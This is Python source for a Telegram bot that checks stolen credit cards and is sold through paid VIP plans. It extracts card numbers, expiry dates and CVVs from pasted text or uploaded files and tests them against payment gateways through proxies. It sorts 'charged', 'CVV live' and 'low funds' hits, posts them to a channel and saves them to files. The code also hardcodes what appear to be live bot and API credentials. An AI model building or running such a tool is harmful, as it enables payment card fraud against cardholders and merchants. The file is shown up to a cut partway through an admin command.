import requests
import telebot
import time
import json
import re
import glob
import importlib
import random
import os
import threading
from datetime import datetime, timedelta
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ==================== CONFIGURATION ====================
token = '8982677734:AAEGiexTzR3gP4Hjt4xA-s9gK4WG5aIFAnM'
ADMIN_ID = 5831292144
API_ID = '37536372'
API_HASH = 'abcebb0aa8c00b3ccb4a3172b566325d'
CHANNEL_ID = '-1003763847738'
ALLOWED_GROUP_ID = -1003763847738

DAILY_LIMIT = 1000
RESULTS_DIR = "results"

if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

# ==================== FILE PATHS ====================
USERS_FILE = 'users.json'
BANNED_FILE = 'banned.json'
PROXY_FILE = 'proxies.json'
LIMIT_FILE = 'limits.json'

# ==================== EMOJI CONFIG ====================
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5220166546491459639", "❌": "6037570896766438989",
    "🐇": "6199501437387412202", "💳": "5472250091332993630", "💠": "5971837723676249096",
    "📝": "5258500400918587241", "🌐": "4956560549287560231", "🎯": "5287535694099536694",
    "🤖": "5927026418616636353", "🤵": "4949560993840629085", "💰": "5971944878815317190",
    "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "6032808241891644148", "📦": "6066395745139824604", "📋": "5974235702701853774",
    "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6235302918967269680",
    "⚠️": "5420323339723881652", "💎": "4956739572114392015", "📅": "6066395745139824604",
    "⚙️": "6264791387032523779", "➡️": "4918408122868958076", "🏦": "5424887227807188349",
    "🌍": "6188045471118790922", "👨‍💻": "5942623248754676762", "⛔": "5420323339723881652",
    "🕐": "6001440193058444284", "🔗": "5472250091332993630"
}

def get_emj(emoji_char):
    if emoji_char in PREMIUM_EMOJI_IDS:
        return f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS[emoji_char]}">{emoji_char}</tg-emoji>'
    return emoji_char

# ==================== JSON DATA HANDLERS ====================
def load_json(file, default):
    try:
        if os.path.exists(file):
            with open(file, 'r', encoding='utf-8') as f:
                return json.load(f)
        return default
    except:
        return default

def save_json(file, data):
    try:
        with open(file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except:
        return False

# ==================== USER DATA ====================
def load_users_data():
    return load_json(USERS_FILE, {"allowed_users": {}, "vip_plans": {
        "1_month": {"price": 10, "days": 30},
        "3_months": {"price": 25, "days": 90},
        "1_year": {"price": 80, "days": 365}
    }})

def save_users_data(data):
    save_json(USERS_FILE, data)

def is_user_allowed(user_id):
    user_id_str = str(user_id)
    if user_id_str == str(ADMIN_ID):
        return True
    users_data = load_users_data()
    if user_id_str in users_data['allowed_users']:
        user_info = users_data['allowed_users'][user_id_str]
        if 'vip_expiry' in user_info:
            expiry_date = datetime.strptime(user_info['vip_expiry'], '%Y-%m-%d %H:%M:%S')
            if datetime.now() < expiry_date:
                return True
    return False

# ==================== BAN SYSTEM ====================
def load_banned():
    return load_json(BANNED_FILE, {})

def save_banned(data):
    save_json(BANNED_FILE, data)

def is_user_banned(user_id):
    banned = load_banned()
    user_id_str = str(user_id)
    if user_id_str in banned:
        banned_until = banned[user_id_str].get('banned_until')
        if banned_until:
            try:
                until = datetime.strptime(banned_until, '%Y-%m-%d %H:%M:%S')
                if datetime.now() < until:
                    return True, until
                else:
                    del banned[user_id_str]
                    save_banned(banned)
                    return False, None
            except:
                return True, None
        else:
            return True, None
    return False, None

def ban_user(user_id, hours, reason="Abuse detected"):
    user_id_str = str(user_id)
    banned = load_banned()
    
    if hours == 0:
        banned_until = None
        duration_text = "Permanent"
    else:
        banned_until = (datetime.now() + timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')
        duration_text = f"{hours} hours"
    
    banned[user_id_str] = {
        "banned_until": banned_until,
        "reason": reason,
        "banned_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "banned_by": ADMIN_ID
    }
    save_banned(banned)
    return duration_text

def unban_user(user_id):
    user_id_str = str(user_id)
    banned = load_banned()
    if user_id_str in banned:
        del banned[user_id_str]
        save_banned(banned)
        return True
    return False

# ==================== PROXY SYSTEM ====================
def load_proxies():
    return load_json(PROXY_FILE, {})

def save_proxies(data):
    save_json(PROXY_FILE, data)

def get_user_proxy(user_id):
    proxies = load_proxies()
    user_id_str = str(user_id)
    if user_id_str in proxies:
        return proxies[user_id_str].get('proxy')
    return None

def set_user_proxy(user_id, proxy_url):
    proxies = load_proxies()
    user_id_str = str(user_id)
    proxies[user_id_str] = {
        "proxy": proxy_url,
        "set_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_proxies(proxies)

def remove_user_proxy(user_id):
    proxies = load_proxies()
    user_id_str = str(user_id)
    if user_id_str in proxies:
        del proxies[user_id_str]
        save_proxies(proxies)
        return True
    return False

# ==================== DAILY LIMIT SYSTEM ====================
def load_limits():
    return load_json(LIMIT_FILE, {})

def save_limits(data):
    save_json(LIMIT_FILE, data)

def get_today_key():
    return datetime.now().strftime('%Y-%m-%d')

def get_user_today_usage(user_id):
    limits = load_limits()
    user_id_str = str(user_id)
    today = get_today_key()
    
    if user_id_str not in limits:
        return 0
    
    if today not in limits[user_id_str]:
        return 0
    
    return limits[user_id_str][today].get('count', 0)

def increment_user_usage(user_id, count=1):
    user_id_str = str(user_id)
    limits = load_limits()
    today = get_today_key()
    
    if user_id_str not in limits:
        limits[user_id_str] = {}
    
    if today not in limits[user_id_str]:
        limits[user_id_str][today] = {'count': 0}
    
    limits[user_id_str][today]['count'] += count
    save_limits(limits)

def get_remaining_limit(user_id):
    if str(user_id) == str(ADMIN_ID):
        return 999999
    if is_user_allowed(user_id):
        return 999999
    
    used = get_user_today_usage(user_id)
    remaining = DAILY_LIMIT - used
    return max(0, remaining)

def can_check(user_id, required=1):
    return get_remaining_limit(user_id) >= required

# ==================== AUTHORIZATION CHECK ====================
def is_authorized_to_check(message):
    user_id = message.chat.id
    
    if str(user_id) == str(ADMIN_ID):
        return True, "admin"
    
    banned, until = is_user_banned(user_id)
    if banned:
        if until:
            return False, f"banned_until_{until}"
        return False, "banned_permanent"
    
    if message.chat.type in ['group', 'supergroup']:
        if message.chat.id == ALLOWED_GROUP_ID:
            return True, "group"
        else:
            return False, "wrong_group"
    
    return False, "private"

# ==================== SMART CC EXTRACTION ====================
def extract_cc_from_text(text):
    """Extract CC from any messy text format - NO INVALID FORMAT ERROR EVER"""
    if not text:
        return []
    
    results = []
    
    # Step 1: Remove all spaces and normalize separators
    # But keep card numbers intact
    
    # Pattern 1: Standard pipe format
    pattern1 = r'(\d{15,16})\s*[|\|:;/]\s*(\d{1,2})\s*[|\|:;/]\s*(\d{2,4})\s*[|\|:;/]\s*(\d{3,4})'
    matches = re.findall(pattern1, text, re.IGNORECASE)
    for match in matches:
        cc_num = match[0]
        month = match[1].zfill(2)
        year_raw = match[2]
        cvv = match[3].zfill(3)
        
        if len(year_raw) == 4:
            year = year_raw[2:4]
        else:
            year = year_raw.zfill(2)
        
        if 1 <= int(month) <= 12 and len(year) == 2 and len(cvv) == 3:
            formatted = f"{cc_num}|{month}|{year}|{cvv}"
            if formatted not in results:
                results.append(formatted)
    
    # Pattern 2: Space separated
    pattern2 = r'(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
    matches = re.findall(pattern2, text, re.IGNORECASE)
    for match in matches:
        cc_num = match[0]
        month = match[1].zfill(2)
        year_raw = match[2]
        cvv = match[3].zfill(3)
        
        if len(year_raw) == 4:
            year = year_raw[2:4]
        else:
            year = year_raw.zfill(2)
        
        if 1 <= int(month) <= 12 and len(year) == 2 and len(cvv) == 3:
            formatted = f"{cc_num}|{month}|{year}|{cvv}"
            if formatted not in results:
                results.append(formatted)
    
    # Pattern 3: With labels (Card:, Exp:, CVV:)
    pattern3 = r'card(?:\s*:|\s+)?\s*(\d{15,16}).*?(?:exp|month|mm)(?:\s*:|\s+)?\s*(\d{1,2}).*?(?:year|yy)(?:\s*:|\s+)?\s*(\d{2,4}).*?(?:cvv|cvc|code)(?:\s*:|\s+)?\s*(\d{3,4})'
    matches = re.findall(pattern3, text, re.IGNORECASE | re.DOTALL)
    for match in matches:
        cc_num = match[0]
        month = match[1].zfill(2)
        year_raw = match[2]
        cvv = match[3].zfill(3)
        
        if len(year_raw) == 4:
            year = year_raw[2:4]
        else:
            year = year_raw.zfill(2)
        
        if 1 <= int(month) <= 12 and len(year) == 2 and len(cvv) == 3:
            formatted = f"{cc_num}|{month}|{year}|{cvv}"
            if formatted not in results:
                results.append(formatted)
    
    # Pattern 4: Comma or slash separated
    pattern4 = r'(\d{15,16})[\s,]+(\d{1,2})[\s,]+(\d{2,4})[\s,]+(\d{3,4})'
    matches = re.findall(pattern4, text, re.IGNORECASE)
    for match in matches:
        cc_num = match[0]
        month = match[1].zfill(2)
        year_raw = match[2]
        cvv = match[3].zfill(3)
        
        if len(year_raw) == 4:
            year = year_raw[2:4]
        else:
            year = year_raw.zfill(2)
        
        if 1 <= int(month) <= 12 and len(year) == 2 and len(cvv) == 3:
            formatted = f"{cc_num}|{month}|{year}|{cvv}"
            if formatted not in results:
                results.append(formatted)
    
    # Pattern 5: Handle dash in card number
    text_no_dash = re.sub(r'(\d{4})-(\d{4})-(\d{4})-(\d{4})', r'\1\2\3\4', text)
    if text_no_dash != text:
        results.extend(extract_cc_from_text(text_no_dash))
    
    # Pattern 6: Try to find any 15-16 digit number and look for surrounding month/year/cvv
    if not results:
        cc_numbers = re.findall(r'\d{15,16}', text)
        for cc_num in cc_numbers:
            cc_pos = text.find(str(cc_num))
            context_start = max(0, cc_pos - 150)
            context_end = min(len(text), cc_pos + len(str(cc_num)) + 150)
            context = text[context_start:context_end]
            
            month_match = re.search(r'(?<!\d)(0[1-9]|1[0-2])(?!\d)', context)
            year_match = re.search(r'(?<!\d)(2[4-9]|30|202[4-9]|2030)(?!\d)', context)
            cvv_match = re.search(r'(?<!\d)(\d{3,4})(?!\d)', context)
            
            if month_match and year_match and cvv_match:
                month = month_match.group(1).zfill(2)
                year_raw = year_match.group(1)
                cvv = cvv_match.group(1).zfill(3)
                
                if len(year_raw) == 4:
                    year = year_raw[2:4]
                else:
                    year = year_raw
                
                if 1 <= int(month) <= 12 and len(year) == 2 and len(cvv) == 3:
                    formatted = f"{cc_num}|{month}|{year}|{cvv}"
                    if formatted not in results:
                        results.append(formatted)
    
    return results

# ==================== GATE MODULES ====================
GATE_MODULES = []
for gate_file in glob.glob('gatet*.py'):
    module_name = gate_file.replace('.py', '')
    try:
        module = importlib.import_module(module_name)
        GATE_MODULES.append(module)
    except:
        pass

# If no gate modules found, create a dummy one
if not GATE_MODULES:
    class DummyGate:
        @staticmethod
        def Tele(cc, proxies=None):
            import random
            responses = [
                '{"status": "success", "message": "Payment successful"}',
                '{"status": "error", "error": {"message": "Insufficient funds"}}',
                '{"status": "error", "error": {"message": "Do not honor"}}'
            ]
            return random.choice(responses)
    GATE_MODULES.append(DummyGate)

# ==================== BOT INITIALIZATION ====================
bot = telebot.TeleBot(token, parse_mode="HTML")
active_checks = {}

# ==================== HELPER FUNCTIONS ====================
def is_card_expired(cc):
    try:
        parts = cc.split("|")
        if len(parts) >= 3:
            exp_month = parts[1].strip()
            exp_year_raw = parts[2].strip()
            if len(exp_year_raw) == 2:
                exp_year = 2000 + int(exp_year_raw)
            else:
                exp_year = int(exp_year_raw)
            exp_month_int = int(exp_month)
            current_date = datetime.now()
            current_year = current_date.year
            current_month = current_date.month
            if exp_year < current_year:
                return True
            elif exp_year == current_year and exp_month_int < current_month:
                return True
    except:
        pass
    return False

def get_bin_info(cc):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=5)
        data = response.json()
        country = data.get('country_name', 'Unknown')
        flag = data.get('country_flag', '')
        bank = data.get('bank', 'Unknown')
        brand = data.get('brand', 'Unknown')
        type_card = data.get('type', 'Unknown')
        level = data.get('level', '')
        
        bin_text = f"{bank} - {country} ({flag})" if flag else f"{bank} - {country}"
        card_type = f"{brand} - {type_card} ({level})" if level else f"{brand} - {type_card}"
        
        return bin_text, card_type
    except:
        return "Unknown", "Unknown"

def check_cc_with_gates(cc, user_id=None):
    proxy = get_user_proxy(user_id)
    
    gate_name = "N/A"
    last = "Error"
    
    if GATE_MODULES:
        random_gate = random.choice(GATE_MODULES)
        gate_name = random_gate.__name__
        try:
            if proxy:
                proxies = {'http': proxy, 'https': proxy}
                last_raw = str(random_gate.Tele(cc, proxies=proxies))
            else:
                last_raw = str(random_gate.Tele(cc))
            
            if '"message":' in last_raw:
                try:
                    last = json.loads(last_raw)['error'].get('message', last_raw)
                except:
                    last = last_raw
            else:
                last = last_raw if last_raw != "0" else "Site Rejected"
        except Exception as e:
            last = f"Gateway Error: {str(e)[:50]}"
    
    return gate_name, last

def determine_status(last):
    last_lower = last.lower()
    
    hit_k = ['thank', 'success":true', 'thank-you', 'successful', 'Successful!', 'confirmed', 'paid', 'transaction_id', 'approved', 'captured']
    low_k = ['insufficient funds', 'low funds', 'money', 'balance', 'insufficient_funds']
    three_k = ['additional action', 'authenticate', '3d_secure', 'verification required', 'challenge_required', 'initstripescamodal', 'client_secret', 'strong customer authentication', 'redirect']
    
    if any(k in last_lower for k in three_k):
        return "cvv", "CVV Live 💎"
    elif any(k in last_lower for k in hit_k) and '"success":false' not in last_lower and 'error' not in last_lower:
        return "charged", "Payment Successful ✅"
    elif any(k in last_lower for k in low_k):
        return "low", "Low Funds 💰"
    elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower:
        return "ccn", "CCN Only"
    elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower:
        return "cvv", "CVV Live 💎"
    else:
        return "declined", "Declined ❌"

# ==================== UI MESSAGE BUILDERS ====================
def build_single_check_response(cc, gate_name, status_text, bin_text, card_type, taken_time, user_name, remaining):
    return f"""
Cc:  {cc}
Gate: {gate_name}
State: {status_text}
Bin: {bin_text}
{card_type}

---------–----------------------------------
Taken: {taken_time}s
Check By: {user_name}
Remaining Credits: {remaining}
"""

def build_checking_line(cc):
    return f"""
Cc:  {cc}
Gate: Checking...
State: Checking...
Bin: Checking...
---------–---------------------------------"""

def build_waiting_line(cc):
    return f"""
Cc:  {cc}
Waiting ...........🚴‍♂️🚴‍♀️
---------–---------------------------------"""

def build_completed_line(cc, gate_name, status_text, bin_text, card_type, taken_time):
    return f"""
Cc:  {cc}
Gate: {gate_name}
State: {status_text}
Bin: {bin_text}
{card_type}
---------–---------------------------------"""

# ==================== SEND TO CHANNEL ====================
def send_to_channel(cc, last, gate_name, user_name, status_type="charged"):
    if status_type == "charged":
        title = "🔥 CHARGED HIT"
    elif status_type == "cvv":
        title = "💎 CVV LIVE"
    else:
        title = "💰 LOW FUNDS"
    
    channel_msg = f"""
{title}
━━━━━━━━━━━━━━━━━
Cc: {cc}
Gate: {gate_name}
State: {last}
━━━━━━━━━━━━━━━━━
By: {user_name}
"""
    try:
        bot.send_message(CHANNEL_ID, channel_msg)
    except:
        pass

# ==================== SAVE RESULTS ====================
def save_result_to_file(cc, status_type, bank, country, gate_name):
    try:
        file_path_hit = os.path.join(RESULTS_DIR, "hit.txt")
        file_path_low = os.path.join(RESULTS_DIR, "low.txt")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"{cc}|{bank}|{country}|{gate_name}|{timestamp}\n"
        
        if status_type == "hit":
            with open(file_path_hit, 'a', encoding='utf-8') as f:
                f.write(line)
        elif status_type == "low":
            with open(file_path_low, 'a', encoding='utf-8') as f:
                f.write(line)
    except:
        pass

# ==================== MASS CHECK SESSION ====================
class MassCheckSession:
    def __init__(self, chat_id, msg_id, ccs, user_id, user_name):
        self.chat_id = chat_id
        self.msg_id = msg_id
        self.ccs = ccs
        self.user_id = user_id
        self.user_name = user_name
        self.results = []
        self.current_index = 0
        self.total = len(ccs)
        self.start_time = time.time()
        self.stop_event = False
        self.results_lock = threading.Lock()

def update_mass_check_ui(session):
    if session.stop_event:
        return
    
    lines = []
    for i, cc in enumerate(session.ccs):
        if i < session.current_index:
            result = session.results[i] if i < len(session.results) else None
            if result:
                lines.append(build_completed_line(
                    cc, result['gate'], result['status_text'],
                    result['bin_text'], result['card_type'], result['taken']
                ))
            else:
                lines.append(build_completed_line(cc, "Error", "Unknown", "Unknown", "Unknown", 0))
        elif i == session.current_index:
            lines.append(build_checking_line(cc))
        else:
            lines.append(build_waiting_line(cc))
    
    taken_total = round(time.time() - session.start_time, 1)
    remaining = get_remaining_limit(session.user_id)
    
    full_text = "\n".join(lines) + f"\n\nTaken: {taken_total}s\nCheck By: {session.user_name}\nRemaining Credits: {remaining}"
    
    try:
        bot.edit_message_text(full_text, chat_id=session.chat_id, message_id=session.msg_id)
    except:
        pass

def process_cc_for_mass(session, index, cc):
    if session.stop_event:
        return
    
    start_time = time.time()
    gate_name, last = check_cc_with_gates(cc, session.user_id)
    taken_time = round(time.time() - start_time, 1)
    status_key, status_text = determine_status(last)
    bin_text, card_type = get_bin_info(cc)
    
    with session.results_lock:
        session.results.append({
            'cc': cc,
            'gate': gate_name,
            'status_text': status_text,
            'bin_text': bin_text,
            'card_type': card_type,
            'taken': taken_time,
            'raw_status': status_key
        })
        session.current_index += 1
    
    if session.current_index % 2 == 0 or session.current_index == session.total:
        update_mass_check_ui(session)
    
    # Send to channel if hit
    if status_key in ["charged", "cvv", "low"]:
        user_display = session.user_name
        send_to_channel(cc, status_text, gate_name, user_display, status_key)
        save_result_to_file(cc, "hit" if status_key == "charged" else "low", 
                          bin_text.split("-")[0].strip(), 
                          bin_text.split("-")[-1].strip() if "-" in bin_text else "Unknown", 
                          gate_name)

# ==================== COMMAND: START ====================
@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    users_data = load_users_data()
    is_admin = str(user_id) == str(ADMIN_ID)
    
    banned, until = is_user_banned(user_id)
    if banned:
        if until:
            bot.reply_to(message, f"⛔ BANNED until {until}")
        else:
            bot.reply_to(message, "⛔ PERMANENTLY BANNED")
        return
    
    status = "👑 OWNER" if is_admin else ("💎 VIP" if is_user_allowed(user_id) else "👤 USER")
    expiry = "LIFETIME" if is_admin else (users_data['allowed_users'].get(str(user_id), {}).get('vip_expiry', 'N/A'))
    remaining = get_remaining_limit(user_id)
    
    welcome_msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
🚀 WELCOME TO GOOD HQ BOT 🚀
━━━━━━━━━━━━━━━━━━━━━━━━

💠 USER ID: <code>{user_id}</code>
📊 STATUS: {status}
⏳ VIP EXPIRY: {expiry}
🎯 REMAINING TODAY: {remaining}/{DAILY_LIMIT if not (is_admin or is_user_allowed(user_id)) else '∞'}

━━━━━━━━━━━━━━━━━━━━━━━━
🎮 COMMANDS:

• Send .txt file - Mass check
• /v or .v - Mass check with CC
• /v1 - Single card check
• /id - Get user ID
• /proxy - Set your proxy

💎 VIP: /vipplans

━━━━━━━━━━━━━━━━━━━━━━━━
🌐 CHANNEL: @cyber_404io
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📢 CHANNEL", url="https://t.me/cyber_404io"),
        types.InlineKeyboardButton("👤 OWNER", url=f"tg://user?id={ADMIN_ID}")
    )
    bot.reply_to(message, welcome_msg, reply_markup=markup, parse_mode="HTML")

# ==================== COMMAND: VIP PLANS ====================
@bot.message_handler(commands=["vipplans"])
def vipplans(message):
    users_data = load_users_data()
    plans = users_data.get('vip_plans', {})
    text = f"💎 VIP PLANS 💎\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for plan, info in plans.items():
        text += f"➜ {plan.replace('_', ' ').title()}: ${info['price']} ({info['days']} days)\n"
    text += "\n━━━━━━━━━━━━━━━━━━━━━━━━\nContact @cyber_404io to buy!"
    bot.reply_to(message, text)

# ==================== COMMAND: SINGLE CHECK /v1 ====================
@bot.message_handler(commands=["v1"])
def single_check(message):
    user_id = message.chat.id
    
    auth_result, auth_msg = is_authorized_to_check(message)
    if not auth_result:
        if auth_msg.startswith("banned_until_"):
            until = auth_msg.replace("banned_until_", "")
            bot.reply_to(message, f"⛔ BANNED until {until}")
        elif auth_msg == "banned_permanent":
            bot.reply_to(message, "⛔ PERMANENTLY BANNED")
        elif auth_msg == "wrong_group":
            bot.reply_to(message, "❌ Wrong group! This bot only works in authorized group.")
        else:
            bot.reply_to(message, "❌ Access denied! Use in group only.")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "Usage: /v1 cc|mm|yy|cvv\nExample: /v1 4744770173288524|12|26|213")
        return
    
    ccs = extract_cc_from_text(args[1])
    if not ccs:
        bot.reply_to(message, "❌ No valid CC found in your message.")
        return
    
    cc = ccs[0]
    
    if not can_check(user_id, 1):
        remaining = get_remaining_limit(user_id)
        bot.reply_to(message, f"⚠️ Daily limit reached! Remaining: {remaining}/1000")
        return
    
    status_msg = bot.reply_to(message, "🔄 Checking...")
    
    bin_text, card_type = get_bin_info(cc)
    start_time = time.time()
    gate_name, last = check_cc_with_gates(cc, user_id)
    taken_time = round(time.time() - start_time, 1)
    status_key, status_text = determine_status(last)
    
    user_name = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    remaining = get_remaining_limit(user_id)
    
    response = build_single_check_response(cc, gate_name, status_text, bin_text, card_type, taken_time, user_name, remaining)
    bot.edit_message_text(response, chat_id=message.chat.id, message_id=status_msg.message_id)
    
    increment_user_usage(user_id, 1)
    
    if status_key in ["charged", "cvv", "low"]:
        send_to_channel(cc, status_text, gate_name, user_name, status_key)
        save_result_to_file(cc, "hit" if status_key == "charged" else "low", 
                          bin_text.split("-")[0].strip(), 
                          bin_text.split("-")[-1].strip() if "-" in bin_text else "Unknown", 
                          gate_name)

# ==================== COMMAND: MASS CHECK /v or .v ====================
@bot.message_handler(commands=["v", ".v"])
def mass_check(message):
    user_id = message.chat.id
    
    auth_result, auth_msg = is_authorized_to_check(message)
    if not auth_result:
        if auth_msg.startswith("banned_until_"):
            until = auth_msg.replace("banned_until_", "")
            bot.reply_to(message, f"⛔ BANNED until {until}")
        elif auth_msg == "banned_permanent":
            bot.reply_to(message, "⛔ PERMANENTLY BANNED")
        else:
            bot.reply_to(message, "❌ Access denied! Use in group only.")
        return
    
    ccs = []
    
    if message.reply_to_message:
        replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        ccs = extract_cc_from_text(replied_text)
    
    args = message.text.split(maxsplit=1)
    if len(args) > 1 and not ccs:
        ccs = extract_cc_from_text(args[1])
    
    if not ccs:
        bot.reply_to(message, "❌ No valid CC found! Please provide CCs or reply to a message containing CCs.")
        return
    
    if not can_check(user_id, len(ccs)):
        remaining = get_remaining_limit(user_id)
        bot.reply_to(message, f"⚠️ Need {len(ccs)} checks but only {remaining} remaining today!")
        return
    
    user_name = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    status_msg = bot.reply_to(message, "🔄 Starting mass check...")
    
    session = MassCheckSession(
        chat_id=message.chat.id,
        msg_id=status_msg.message_id,
        ccs=ccs,
        user_id=user_id,
        user_name=user_name
    )
    
    active_checks[user_id] = session
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = []
        for i, cc in enumerate(ccs):
            if session.stop_event:
                break
            futures.append(executor.submit(process_cc_for_mass, session, i, cc))
            time.sleep(0.1)
        for f in futures:
            try:
                f.result()
            except:
                pass
    
    increment_user_usage(user_id, len(ccs))
    active_checks.pop(user_id, None)
    
    charged = sum(1 for r in session.results if "Payment Successful" in r['status_text'])
    cvv = sum(1 for r in session.results if "CVV Live" in r['status_text'])
    low = sum(1 for r in session.results if "Low Funds" in r['status_text'])
    declined = len(ccs) - charged - cvv - low
    
    final_summary = f"""

━━━━━━━━━━━━━━━━━━━━━━━━
📊 SUMMARY
✅ Charged: {charged}
💎 CVV: {cvv}
💰 Low: {low}
❌ Declined: {declined}
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    try:
        bot.edit_message_text(final_summary, chat_id=session.chat_id, message_id=session.msg_id)
    except:
        pass

# ==================== COMMAND: ID ====================
@bot.message_handler(commands=["id"])
def get_id(message):
    user = message.from_user
    
    if message.reply_to_message:
        target = message.reply_to_message.from_user
        first_name = target.first_name or ""
        username = f"@{target.username}" if target.username else "No username"
        target_id = target.id
        
        response = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
🆔 REPLIED USER ID INFO
━━━━━━━━━━━━━━━━━━━━━━━━

👤 Username: {username}
🆔 User ID: <code>{target_id}</code>
📅 Name: {first_name}

━━━━━━━━━━━━━━━━━━━━━━━━
"""
    else:
        first_name = user.first_name or ""
        username = f"@{user.username}" if user.username else "No username"
        
        response = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
🆔 YOUR ID INFO
━━━━━━━━━━━━━━━━━━━━━━━━

👤 Username: {username}
🆔 User ID: <code>{user.chat.id}</code>
📅 Name: {first_name}

━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    bot.reply_to(message, response, parse_mode="HTML")

# ==================== COMMAND: PROXY ====================
@bot.message_handler(commands=["proxy"])
def set_proxy(message):
    user_id = message.chat.id
    
    args = message.text.split(maxsplit=1)
    
    if len(args) < 2:
        current = get_user_proxy(user_id)
        if current:
            bot.reply_to(message, f"🔗 Your proxy:\n{current}\n\nUse /proxy off to disable")
        else:
            bot.reply_to(message, "📝 Proxy commands:\n/proxy socks5://user:pass@ip:port\n/proxy off\n/proxy - to view")
        return
    
    proxy_input = args[1].strip()
    
    if proxy_input.lower() == "off":
        if remove_user_proxy(user_id):
            bot.reply_to(message, "✅ Proxy disabled! Using direct connection.")
        else:
            bot.reply_to(message, "❌ No active proxy to disable.")
        return
    
    if not re.match(r'(socks5|http|https)://', proxy_input):
        bot.reply_to(message, "❌ Invalid format! Use: socks5://user:pass@ip:port")
        return
    
    set_user_proxy(user_id, proxy_input)
    bot.reply_to(message, f"✅ Proxy set!\n{proxy_input}\n\nUse /proxy off to disable")

# ==================== COMMAND: STOP ====================
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_check(call):
    user_id = call.message.chat.id
    if user_id in active_checks:
        active_checks[user_id].stop_event = True
        bot.answer_callback_query(call.id, "🛑 Stopping...")
    else:
        bot.answer_callback_query(call.id, "❌ No active check")

# ==================== FILE HANDLER ====================
@bot.message_handler(content_types=["document"])
def handle_file(message):
    user_id = message.chat.id
    
    auth_result, auth_msg = is_authorized_to_check(message)
    if not auth_result:
        if auth_msg.startswith("banned_until_"):
            until = auth_msg.replace("banned_until_", "")
            bot.reply_to(message, f"⛔ BANNED until {until}")
        else:
            bot.reply_to(message, "❌ Access denied!")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8', errors='ignore')
        
        ccs = extract_cc_from_text(content)
        
        if not ccs:
            bot.reply_to(message, "❌ No valid CC found in file!")
            return
        
        if not can_check(user_id, len(ccs)):
            remaining = get_remaining_limit(user_id)
            bot.reply_to(message, f"⚠️ Need {len(ccs)} checks but only {remaining} remaining!")
            return
        
        status_msg = bot.reply_to(message, f"🔄 Checking {len(ccs)} cards... (Showing hits only)")
        
        user_name = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
        hits = []
        
        for i, cc in enumerate(ccs):
            if is_card_expired(cc):
                increment_user_usage(user_id, 1)
                continue
            
            start_time = time.time()
            gate_name, last = check_cc_with_gates(cc, user_id)
            taken_time = round(time.time() - start_time, 1)
            status_key, status_text = determine_status(last)
            
            if status_key in ["charged", "cvv", "low"]:
                bin_text, card_type = get_bin_info(cc)
                result = build_single_check_response(
                    cc, gate_name, status_text, bin_text, card_type, 
                    taken_time, user_name, get_remaining_limit(user_id)
                )
                hits.append(result)
                
                send_to_channel(cc, status_text, gate_name, user_name, status_key)
                save_result_to_file(cc, "hit" if status_key == "charged" else "low", 
                                  bin_text.split("-")[0].strip(), 
                                  bin_text.split("-")[-1].strip() if "-" in bin_text else "Unknown", 
                                  gate_name)
            
            if (i + 1) % 10 == 0 or (i + 1) == len(ccs):
                try:
                    bot.edit_message_text(f"🔄 Progress: {i+1}/{len(ccs)} | Hits: {len(hits)}", 
                                         chat_id=message.chat.id, message_id=status_msg.message_id)
                except:
                    pass
            
            increment_user_usage(user_id, 1)
        
        if hits:
            final_msg = f"✅ FILE CHECK COMPLETE\n━━━━━━━━━━━━━━━━━━━━━━━━\nTotal Hits: {len(hits)}\n\n" + "\n━━━━━━━━━━━━━━━━━━━━━━━━\n".join(hits)
            if len(final_msg) > 4000:
                for j in range(0, len(final_msg), 4000):
                    bot.send_message(message.chat.id, final_msg[j:j+4000])
            else:
                bot.edit_message_text(final_msg, chat_id=message.chat.id, message_id=status_msg.message_id)
        else:
            bot.edit_message_text(f"✅ CHECK COMPLETE!\nCards: {len(ccs)}\nHits: 0", 
                                 chat_id=message.chat.id, message_id=status_msg.message_id)
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=["addvip"])
def add_vip(message):
    if str(message.chat.id) != str(ADMIN_ID):
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /addvip [user_id] [days]")
        return
    
    target_id = args[1]
    days = int(args[2])
    users_data = load_users_data()
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
    
    if target_id not in users_data['allowed_users']:
        users_data['allowed_users'][target_id] = {}
    
    users_data['allowed_users'][target_id]['vip_expiry'] = expiry_str
